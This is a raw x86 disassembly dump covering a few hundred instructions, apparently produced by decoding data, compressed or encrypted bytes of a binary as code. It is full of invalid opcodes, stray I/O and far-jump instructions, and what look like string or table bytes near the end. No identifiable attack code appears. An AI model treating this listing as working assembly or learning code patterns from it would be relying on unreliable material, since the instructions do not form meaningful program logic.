  41fb55:	inc    esi
  41fb56:	push   es
  41fb57:	ror    BYTE PTR [edx+esi*8+0x1df0f3f0],cl
  41fb5e:	sub    ebx,ecx
  41fb60:	scas   eax,DWORD PTR es:[edi]
  41fb61:	jmp    0x41fb38
  41fb63:	fstp   TBYTE PTR [ebx]
  41fb65:	dec    edi
  41fb66:	ins    BYTE PTR es:[edi],dx
  41fb67:	or     al,0x4e
  41fb69:	xor    al,BYTE PTR [ebx+0x4df653f0]
  41fb6f:	or     BYTE PTR [ecx+0x86bbb20],dh
  41fb75:	and    eax,0x2cc7322b
  41fb7a:	fisttp DWORD PTR ds:0x67f6420a
  41fb80:	pop    edi
  41fb81:	repnz fcomip st,st(5)
  41fb84:	xchg   ebp,eax
  41fb85:	leave  
  41fb86:	sahf   
  41fb87:	push   esi
  41fb88:	jmp    0x41fbe7
  41fb8a:	(bad)  
  41fb8b:	mov    WORD PTR [ebp+0x14],ds
  41fb8e:	add    ebx,DWORD PTR [ebp+0x13]
  41fb91:	fistp  DWORD PTR [ecx+0x27]
  41fb94:	fwait
  41fb95:	mov    esp,0xc4218f85
  41fb9a:	iret   
  41fb9b:	sub    bl,BYTE PTR [ebp+0xb3dbbe]
	...
  41fba9:	add    BYTE PTR [eax],al
  41fbab:	stc    
  41fbac:	sbb    al,al
  41fbae:	inc    esi
  41fbaf:	jecxz  0x41fb8f
  41fbb1:	(bad)  
  41fbb2:	mov    edi,0xe1f1bc83
  41fbb7:	adc    ebp,DWORD PTR cs:0x1a8d38d
  41fbbe:	add    BYTE PTR [ebp+0x61000000],ch
  41fbc4:	mov    al,0x5b
  41fbc6:	push   es
  41fbc7:	push   edx
  41fbc8:	mov    ds,eax
  41fbca:	int3   
  41fbcb:	xchg   edi,eax
  41fbcd:	and    eax,DWORD PTR [ebx+0x5b]
  41fbd0:	dec    edi
  41fbd1:	push   cs
  41fbd2:	aad    0xc7
  41fbd4:	jb     0x41fbef
  41fbd6:	in     al,0xbe
  41fbd8:	popa   
  41fbd9:	xor    al,BYTE PTR [esi-0x1d9a18ca]
  41fbdf:	fistp  QWORD PTR [ebp+edi*4+0x5a1e5ef9]
  41fbe6:	or     al,0xdb
  41fbe8:	neg    BYTE PTR [edx+esi*4+0x7f6632bd]
  41fbef:	test   eax,ecx
  41fbf1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fbf2:	outs   dx,DWORD PTR ds:[esi]
  41fbf3:	inc    edx
  41fbf4:	jb     0x41fb93
  41fbf6:	adc    eax,0x996ffa54
  41fbfb:	adc    WORD PTR [esi-0x74],di
  41fbff:	call   0x76e81cca
  41fc04:	int    0xd5
  41fc06:	cld    
  41fc07:	popa   
  41fc08:	stc    
  41fc09:	cmp    DWORD PTR [eax-0x39d96ec9],eax
  41fc0f:	inc    ebp
  41fc10:	fwait
  41fc11:	pop    ds
  41fc12:	int    0x98
  41fc14:	jg     0x41fbe6
  41fc16:	sar    cl,cl
  41fc18:	xchg   edx,eax
  41fc19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc1a:	in     eax,0xc7
  41fc1c:	cmp    eax,0xaf19ca66
  41fc21:	sub    dh,BYTE PTR [eax]
  41fc23:	push   0x39
  41fc25:	and    eax,0x111d475e
  41fc2a:	xchg   esi,eax
  41fc2b:	call   0x96a1:0x7e387f2b
  41fc32:	push   0xffffff9f
  41fc34:	sbb    dl,cl
  41fc36:	mov    cl,0x55
  41fc38:	div    BYTE PTR [edi+0x2f]
  41fc3b:	inc    esi
  41fc3c:	cs dec esi
  41fc3e:	or     al,0xa1
  41fc40:	in     eax,dx
  41fc41:	or     al,BYTE PTR fs:0xc8e4dcf
  41fc48:	xchg   edx,eax
  41fc49:	ret    0x5c25
  41fc4c:	nop
  41fc4d:	fnsave [ebx+0x781b302]
  41fc53:	cmc    
  41fc54:	ins    BYTE PTR es:[edi],dx
  41fc55:	(bad)  
  41fc56:	xor    ch,BYTE PTR [esi-0x106148d3]
  41fc5c:	aad    0x40
  41fc5e:	out    0xba,eax
  41fc60:	xchg   ebx,eax
  41fc61:	add    DWORD PTR [edi+0x6058605d],esi
  41fc67:	jnp    0x41fca8
  41fc69:	adc    BYTE PTR [edx-0x64],0xa4
  41fc6d:	or     al,0x6a
  41fc6f:	jl     0x41fc71
	...
  41fc79:	add    BYTE PTR [eax],al
  41fc7b:	mov    eax,ds:0x3e8336b9
  41fc80:	(bad)  
  41fc81:	mov    ch,0xbb
  41fc83:	icebp  
  41fc84:	and    eax,0x6278c27
  41fc89:	fldenv [edi]
  41fc8b:	sub    BYTE PTR [ecx+0xad0001],0x0
  41fc92:	add    BYTE PTR [eax],ch
  41fc94:	add    al,bl
  41fc96:	imul   ebx,esi,0xa
  41fc99:	cdq    
  41fc9a:	cwde   
  41fc9b:	pusha  
  41fc9c:	ds or  ebp,edx
  41fc9f:	xor    cl,BYTE PTR ss:[esi+0x3be69d7f]
  41fca6:	out    dx,eax
  41fca7:	pop    edi
  41fca8:	cwde   
  41fca9:	sbb    eax,0xf4b9fc2f
  41fcae:	xchg   DWORD PTR [eax+0x6f],eax
  41fcb1:	jg     0x575cb1c9
  41fcb7:	pop    es
  41fcb8:	jnp    0x41fcfb
  41fcba:	xchg   ah,al
  41fcbc:	dec    esi
  41fcbd:	cmc    
  41fcbe:	sbb    DWORD PTR [edi+0x78],esp
  41fcc1:	xchg   edi,eax
  41fcc2:	cmp    DWORD PTR [esi-0x43abaac6],ebp
  41fcc8:	ss mov edx,ds
  41fccb:	inc    esp
  41fccc:	jb     0x41fc72
  41fcce:	push   edi
  41fccf:	ja     0x41fd2b
  41fcd1:	mov    dl,0xad
  41fcd3:	dec    edi
  41fcd4:	push   esi
  41fcd5:	cli    
  41fcd6:	outs   dx,DWORD PTR ds:[esi]
  41fcd7:	push   ebx
  41fcd8:	inc    ebp
  41fcd9:	pop    ecx
  41fcda:	nop
  41fcdb:	xor    BYTE PTR [eax+0x15ec6cda],0x72
  41fce2:	lods   al,BYTE PTR ds:[esi]
  41fce3:	lock jmp 0x53a93c78
  41fce9:	inc    ebx
  41fcea:	(bad)  
  41fceb:	daa    
  41fcec:	inc    ebp
  41fced:	stos   BYTE PTR es:[edi],al
  41fcee:	cmp    DWORD PTR [ebp+0x6a2804d5],esi
  41fcf4:	sub    eax,0xac0f6e18
  41fcf9:	jmp    0x41fd7a
  41fcfb:	mov    ds:0xac4ea016,al
  41fd00:	rol    bl,cl
  41fd02:	sub    BYTE PTR [ecx-0x4b],dh
  41fd05:	xor    al,0xff
  41fd07:	lds    ebx,FWORD PTR ds:0xbba61ec4
  41fd0d:	in     al,0x58
  41fd0f:	fadd   QWORD PTR [ebx-0xf7e1157]
  41fd15:	lods   eax,DWORD PTR ds:[esi]
  41fd16:	adc    cl,ch
  41fd18:	mov    al,ds:0x527873fe
  41fd1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd1e:	loopne 0x41fce8
  41fd20:	scas   al,BYTE PTR es:[edi]
  41fd21:	lods   eax,DWORD PTR ds:[esi]
  41fd22:	rcl    BYTE PTR [eax+0x50],0x13
  41fd26:	(bad)  
  41fd27:	jnp    0x41fcd1
  41fd29:	fdivr  QWORD PTR [eax+0x39f75897]
  41fd2f:	out    0x74,eax
  41fd31:	shl    BYTE PTR [eax+0x5a28e0d5],cl
  41fd37:	jno    0x41fd6b
  41fd39:	push   0x6f
  41fd3b:	dec    esp
  41fd3c:	adc    DWORD PTR [edx],esi
  41fd3e:	xor    eax,0x5b
	...
  41fd4b:	adc    dl,bh
  41fd4d:	repz or esi,edi
  41fd50:	das    
  41fd51:	cli    
  41fd52:	fist   WORD PTR [ecx]
  41fd54:	dec    ebx
  41fd55:	es nop
  41fd57:	pop    edi
  41fd58:	sub    eax,0xaa2de813
  41fd5d:	add    DWORD PTR [eax],eax
  41fd5f:	lods   eax,DWORD PTR ds:[esi]
  41fd60:	add    BYTE PTR [eax],al
  41fd62:	add    BYTE PTR [ebp-0x404b1bd4],dh
  41fd68:	jno    0x41fde2
  41fd6a:	jmp    0x969c:0xc247b92d
  41fd71:	scas   eax,DWORD PTR es:[edi]
  41fd72:	dec    ebx
  41fd73:	popf   
  41fd74:	daa    
  41fd75:	repz aam 0x54
  41fd78:	inc    esp
  41fd79:	cmc    
  41fd7a:	sub    edi,DWORD PTR [eax]
  41fd7c:	dec    ecx
  41fd7d:	inc    edx
  41fd7e:	cmp    bx,WORD PTR [ebp-0x17]
  41fd82:	add    al,BYTE PTR [ebp-0x45]
  41fd85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd86:	mov    dh,0x80
  41fd88:	out    dx,al
  41fd89:	xchg   edx,eax
  41fd8a:	mov    BYTE PTR [edi+0x1983c550],dh
  41fd90:	fdivp  st(4),st
  41fd92:	loopne 0x41fe0b
  41fd94:	cli    
  41fd95:	scas   al,BYTE PTR es:[edi]
  41fd96:	add    esp,DWORD PTR [edi+0x5e758991]
  41fd9c:	inc    ebx
  41fd9d:	shl    DWORD PTR ds:[ebx],cl
  41fda0:	xchg   DWORD PTR [ebx-0x34],eax
  41fda3:	jno    0x41fdb1
  41fda5:	xchg   edi,eax
  41fda6:	ret    
  41fda7:	imul   eax,DWORD PTR ds:0x85362a9b,0x76
  41fdae:	or     DWORD PTR [esi-0x71167341],eax
  41fdb4:	addr16 xchg ebx,eax
  41fdb6:	jmp    0x2181:0x32d28837
  41fdbd:	out    0x48,eax
  41fdbf:	js     0x41fe17
  41fdc1:	push   0x1b
  41fdc3:	retf   
  41fdc4:	adc    eax,DWORD PTR [edx+0x1687601d]
  41fdca:	ror    BYTE PTR [ebx+0x24532be],cl
  41fdd0:	lds    ebp,FWORD PTR [ecx]
  41fdd2:	and    eax,0x5f331e6f
  41fdd7:	xor    DWORD PTR [ebx],ecx
  41fdd9:	fidiv  WORD PTR [esp+edi*2+0x6d]
  41fddd:	sub    eax,0xe2118011
  41fde2:	add    bl,cl
  41fde4:	and    DWORD PTR [ecx-0x66],ebx
  41fde7:	pop    esp
  41fde8:	out    0xfa,eax
  41fdea:	mov    ds:0xae3a21a9,al
  41fdef:	or     edi,edi
  41fdf1:	sar    DWORD PTR [ebp+0x56b368cd],1
  41fdf7:	cld    
  41fdf8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fdf9:	add    esi,ebp
  41fdfb:	aam    0x8a
  41fdfd:	add    DWORD PTR [eax],0xffffff95
  41fe00:	and    DWORD PTR [ecx],ebx
  41fe02:	push   ds
  41fe03:	imul   edi,DWORD PTR [esi+0x1a5fae4f],0xffffff87
  41fe0a:	enter  0xc771,0xa4
  41fe0e:	adc    dl,ah
	...
  41fe18:	add    BYTE PTR [eax],al
  41fe1a:	add    BYTE PTR [edx],dl
  41fe1c:	mov    edx,0xe6f8c6d8
  41fe21:	push   ds
  41fe22:	(bad)  
  41fe23:	adc    bl,dh
  41fe25:	cwde   
  41fe26:	out    dx,al
  41fe27:	add    DWORD PTR [ebp-0x4c],ebx
  41fe2a:	sbb    edx,0xffffffaa
  41fe2d:	add    DWORD PTR [eax],eax
  41fe2f:	lods   eax,DWORD PTR ds:[esi]
  41fe30:	add    BYTE PTR [eax],al
  41fe32:	add    BYTE PTR [ecx],ah
  41fe34:	and    eax,0x6efb4a86
  41fe39:	cmc    
  41fe3a:	(bad)  
  41fe3b:	fdiv   st,st(2)
  41fe3d:	scas   eax,DWORD PTR es:[edi]
  41fe3e:	jnp    0x41fe78
  41fe40:	int3   
  41fe41:	xchg   ebx,eax
  41fe42:	ins    BYTE PTR es:[edi],dx
  41fe43:	sub    eax,esi
  41fe45:	(bad)  
  41fe46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe47:	lods   eax,DWORD PTR ds:[esi]
  41fe48:	cmp    al,0x3
  41fe4a:	js     0x41fdd8
  41fe4c:	or     BYTE PTR [ebx],0x3d
  41fe4f:	cmp    esp,ebx
  41fe51:	cmp    edi,esp
  41fe53:	xchg   edx,eax
  41fe54:	leave  
  41fe55:	sbb    bl,BYTE PTR [edx]
  41fe57:	icebp  
  41fe58:	in     eax,dx
  41fe59:	popf   
  41fe5a:	outs   dx,DWORD PTR ds:[esi]
  41fe5b:	add    bh,BYTE PTR [edx+edx*1-0x35]
  41fe5f:	jbe    0x41fe25
  41fe61:	and    eax,DWORD PTR [ecx*1-0x30340537]
  41fe68:	rcr    edi,cl
  41fe6a:	cmp    bl,BYTE PTR [ecx+0x43]
  41fe6d:	inc    ebp
  41fe6e:	push   0x3e
  41fe70:	push   esp
  41fe71:	sub    al,0x6c
  41fe73:	loope  0x41fe4d
  41fe75:	(bad)  
  41fe76:	mov    bl,0x1f
  41fe78:	sub    ebp,DWORD PTR cs:[ebp+0x3c]
  41fe7c:	adc    bl,ah
  41fe7e:	in     al,0xff
  41fe80:	push   0x39
  41fe82:	jno    0x41feec
  41fe84:	dec    ebp
  41fe85:	and    BYTE PTR [edx-0x5f],0x22
  41fe89:	jge    0x41fe11
  41fe8b:	aas    
  41fe8c:	push   esi
  41fe8d:	xchg   edi,eax
  41fe8e:	loop   0x41fe1e
  41fe90:	sar    BYTE PTR [edx-0x4a417751],1
  41fe96:	les    edx,FWORD PTR [ebp-0x1a125029]
  41fe9c:	mov    al,fs:0x4b9d4dcd
  41fea2:	(bad)  
  41fea3:	cld    
  41fea4:	in     eax,dx
  41fea5:	cmp    eax,0xaf84a038
  41feaa:	xor    DWORD PTR [ecx+0x1307650c],ecx
  41feb0:	in     al,0x75
  41feb2:	mov    eax,ds:0x82a259ef
  41feb7:	mov    bh,0xb0
  41feb9:	fld    DWORD PTR [ebp-0x1b]
  41febc:	cmp    al,0xb7
  41febe:	jo     0x41fe4d
  41fec0:	jp     0x41fe5e
  41fec2:	adc    ebp,ebp
  41fec4:	std    
  41fec5:	sbb    cl,BYTE PTR [ebp-0x8]
  41fec8:	rcr    BYTE PTR [edi+0x45],0xcc
  41fecc:	inc    esp
  41fecd:	sahf   
  41fece:	mov    eax,DWORD PTR [esi+0x34]
  41fed1:	sub    DWORD PTR [esi+esi*2-0x1efda0eb],esp
  41fed8:	das    
  41fed9:	inc    ebp
  41feda:	test   BYTE PTR [edi-0x25],ch
  41fedd:	icebp  
  41fede:	(bad)  
	...
  41feec:	nop
  41feed:	inc    edx
  41feee:	add    BYTE PTR [eax+edx*4],al
  41fef1:	inc    edx
  41fef2:	add    BYTE PTR [eax],cl
  41fef4:	nop
  41fef5:	inc    edx
  41fef6:	add    BYTE PTR [eax+edx*4],cl
  41fef9:	inc    edx
  41fefa:	add    BYTE PTR [eax],dl
  41fefc:	nop
  41fefd:	inc    edx
  41fefe:	add    BYTE PTR [eax+edx*4],dl
  41ff01:	inc    edx
  41ff02:	add    BYTE PTR [eax],bl
  41ff04:	nop
  41ff05:	inc    edx
  41ff06:	add    BYTE PTR [eax+edx*4],bl
  41ff09:	inc    edx
  41ff0a:	add    BYTE PTR [esi+0x49],cl
  41ff0d:	dec    esi
  41ff0e:	pop    edi
  41ff0f:	pop    edx
  41ff10:	dec    edx
  41ff11:	inc    ecx
  41ff12:	xor    eax,DWORD PTR [eax]
  41ff14:	push   ebx
  41ff15:	push   edi
  41ff16:	inc    edi
  41ff17:	cmp    DWORD PTR [edi+0x41],ebx
  41ff1a:	pop    eax
  41ff1b:	ss push esi
  41ff1d:	pop    ecx
  41ff1e:	add    BYTE PTR [ebx+0x43],dl
  41ff21:	inc    ebp
  41ff22:	pop    edi
  41ff23:	inc    ecx
  41ff24:	pop    eax
  41ff25:	push   edi
  41ff26:	dec    eax
  41ff27:	inc    edx
  41ff28:	pop    edi
  41ff29:	cmp    DWORD PTR [ecx+0x4d],ecx
  41ff2c:	dec    ecx
  41ff2d:	add    BYTE PTR [ecx+0x46],al
  41ff30:	cmp    DWORD PTR [edx],esi
  41ff32:	xor    ebx,DWORD PTR [edi+0x32]
  41ff35:	aaa    
  41ff36:	inc    esp
  41ff37:	inc    esp
  41ff38:	pop    edi
  41ff39:	xor    eax,0x41545800
  41ff3e:	pop    edi
  41ff3f:	push   ecx
  41ff40:	push   esp
  41ff41:	inc    esi
  41ff42:	push   ebp
  41ff43:	cmp    DWORD PTR [eax],eax
  41ff45:	push   edi
  41ff46:	push   ebp
  41ff47:	inc    ecx
  41ff48:	xor    dh,BYTE PTR [ebx]
  41ff4a:	xor    ebx,DWORD PTR [edi+0x4e]
  41ff4d:	add    BYTE PTR [esp+ecx*2+0x4d],dl
  41ff51:	cmp    DWORD PTR [edi+0x38],ebx
  41ff54:	dec    ecx
  41ff55:	cmp    DWORD PTR [edx+0x36],ebx
  41ff58:	pop    edi
  41ff59:	dec    edx
  41ff5a:	xor    BYTE PTR [edx+0x34],cl
  41ff5d:	add    BYTE PTR [ecx+eax*2+0x34],cl
  41ff61:	xor    esi,DWORD PTR [eax]
  41ff63:	pop    edi
  41ff64:	inc    edx
  41ff65:	dec    ebx
  41ff66:	pop    eax
  41ff67:	pop    eax
  41ff68:	xor    eax,0x51414d00
  41ff6d:	pop    edi
  41ff6e:	inc    ecx
  41ff6f:	xor    al,BYTE PTR [ebp+0x5f]
  41ff72:	inc    ecx
  41ff73:	dec    ebx
  41ff74:	cmp    DWORD PTR ds:0x5a003939,esi
  41ff7a:	inc    ebp
  41ff7b:	cmp    BYTE PTR [edi+0x4d],bl
  41ff7e:	ss dec eax
  41ff80:	dec    ebx
  41ff81:	add    BYTE PTR [ebp+0x57],al
  41ff84:	xor    DWORD PTR [edi+0x31],ebx
  41ff87:	dec    ebx
  41ff88:	xor    eax,DWORD PTR [ecx+0x30]
  41ff8b:	push   ebx
  41ff8c:	add    BYTE PTR [edx+esi*1+0x36],al
  41ff90:	aaa    
  41ff91:	pop    edi
  41ff92:	push   edx
  41ff93:	dec    eax
  41ff94:	dec    ebp
  41ff95:	cmp    BYTE PTR [edi+0x37],bl
  41ff98:	inc    esi
  41ff99:	xor    eax,0x35005500
  41ff9e:	add    BYTE PTR [ebx+0x0],al
  41ffa1:	pop    edi
  41ffa2:	add    BYTE PTR [ecx+0x0],bl
  41ffa5:	dec    ecx
  41ffa6:	add    BYTE PTR [ebx+0x0],dl
  41ffa9:	xor    al,BYTE PTR [eax]
  41ffab:	pop    edi
  41ffac:	add    BYTE PTR [edx+0x0],dl
  41ffaf:	add    BYTE PTR [eax],al
  41ffb1:	push   eax
  41ffb2:	add    BYTE PTR [ebp+0x0],dl
  41ffb5:	dec    ecx
  41ffb6:	add    BYTE PTR [eax],dh
  41ffb8:	add    BYTE PTR [edi+0x0],bl
  41ffbb:	inc    ebx
  41ffbc:	add    BYTE PTR [esi],dh
  41ffbe:	add    BYTE PTR [ebp+0x0],al
  41ffc1:	xor    al,BYTE PTR [eax]
  41ffc3:	pop    edi
  41ffc4:	add    BYTE PTR [ebp+0x0],cl
  41ffc7:	xor    al,0x0
  41ffc9:	dec    edx
  41ffca:	add    BYTE PTR [edx+0x0],dl
  41ffcd:	push   ebp
  41ffce:	add    BYTE PTR [eax],al
  41ffd0:	add    BYTE PTR [esi+0x0],cl
  41ffd3:	cmp    DWORD PTR [eax],eax
  41ffd5:	push   eax
  41ffd6:	add    BYTE PTR [edi+0x0],bl
  41ffd9:	push   ebp
  41ffda:	add    BYTE PTR [ecx],bh
  41ffdc:	add    BYTE PTR [esi],dh
  41ffde:	add    BYTE PTR [eax],dh
  41ffe0:	add    BYTE PTR [ecx],dh
  41ffe2:	add    BYTE PTR [edi+0x0],bl
  41ffe5:	dec    edi
  41ffe6:	add    BYTE PTR [esi+0x0],cl
  41ffe9:	push   esp
  41ffea:	add    BYTE PTR [eax],bh
  41ffec:	add    BYTE PTR [eax],al
  41ffee:	add    BYTE PTR [eax+eax*1+0x34],cl
  41fff2:	add    BYTE PTR [eax+eax*1+0x31],al
  41fff6:	add    BYTE PTR [edi+0x0],bl
  41fff9:	dec    ebx
  41fffa:	add    BYTE PTR [ecx],dh
  41fffc:	add    BYTE PTR [ebp+0x0],al
  41ffff:	pop    edi
  420000:	add    BYTE PTR [edx+0x0],bl
  420003:	add    BYTE PTR [eax],al
  420005:	push   esp
  420006:	add    BYTE PTR [edi],dh
  420008:	add    BYTE PTR [ebx+0x0],al
  42000b:	pop    edi
  42000c:	add    BYTE PTR [edx+0x0],al
  42000f:	xor    al,BYTE PTR [eax]
  420011:	xor    DWORD PTR [eax],eax
  420013:	push   ebx
  420014:	add    BYTE PTR [ecx],dh
  420016:	add    BYTE PTR [ecx],bh
  420018:	add    BYTE PTR [edx+0x0],al
  42001b:	add    BYTE PTR [eax],al
  42001d:	inc    edi
  42001e:	add    BYTE PTR [ebp+0x0],al
  420021:	xor    al,0x0
  420023:	cmp    BYTE PTR [eax],al
  420025:	add    BYTE PTR [eax],al
  420027:	add    BYTE PTR [eax+0x42],dl
  42002a:	add    BYTE PTR [eax+edx*2],al
  42002d:	inc    edx
  42002e:	add    BYTE PTR [eax],cl
  420030:	push   eax
  420031:	inc    edx
  420032:	add    BYTE PTR [eax+edx*2],cl
  420035:	inc    edx
  420036:	add    BYTE PTR [eax],dl
  420038:	push   eax
  420039:	inc    edx
  42003a:	add    BYTE PTR [eax+edx*2],dl
  42003d:	inc    edx
  42003e:	add    BYTE PTR [eax],bl
  420040:	push   eax
  420041:	inc    edx
  420042:	add    BYTE PTR [eax+edx*2],bl
  420045:	inc    edx
  420046:	add    BYTE PTR [eax],ah
  420048:	push   eax
  420049:	inc    edx
  42004a:	add    BYTE PTR [eax+edx*2],ah
  42004d:	inc    edx
  42004e:	add    BYTE PTR [eax],ch
  420050:	push   eax
  420051:	inc    edx
	...
  420062:	add    BYTE PTR [eax],al
  420064:	call   0x0:0x4d3ef2
  42006b:	add    BYTE PTR [edx+0x1000200],dl
  420071:	add    BYTE PTR [eax],al
  420073:	add    BYTE PTR [ecx],al
  420075:	add    BYTE PTR [eax],al
  420077:	add    BYTE PTR [ecx],al
  420079:	add    BYTE PTR [eax],al
  42007b:	add    BYTE PTR [eax-0x73fffe00],cl
  420081:	add    BYTE PTR [edx],al
  420083:	add    BYTE PTR [eax-0x23fffe00],dl
  420089:	cmp    al,0x0
  42008b:	add    BYTE PTR [esi+0x200],bl
  420091:	add    BYTE PTR [edi+0x6f],dl
  420094:	jb     0x4200fa
  420096:	push   edi
  420097:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  42009e:	aas    
  42009f:	inc    ebx
  4200a0:	ins    BYTE PTR es:[edi],dx
  4200a1:	outs   dx,DWORD PTR ds:[esi]
  4200a2:	jae    0x420109
  4200a4:	push   edi
  4200a5:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  4200ac:	popa   
  4200ad:	je     0x420118
  4200af:	outs   dx,DWORD PTR ds:[esi]
  4200b0:	outs   dx,BYTE PTR ds:[esi]
  4200b1:	inc    ebx
  4200b2:	ins    BYTE PTR es:[edi],dx
  4200b3:	outs   dx,DWORD PTR ds:[esi]
  4200b4:	jae    0x42011b
  4200b6:	push   edi
  4200b7:	imul   eax,DWORD PTR [eax],0x0
	...
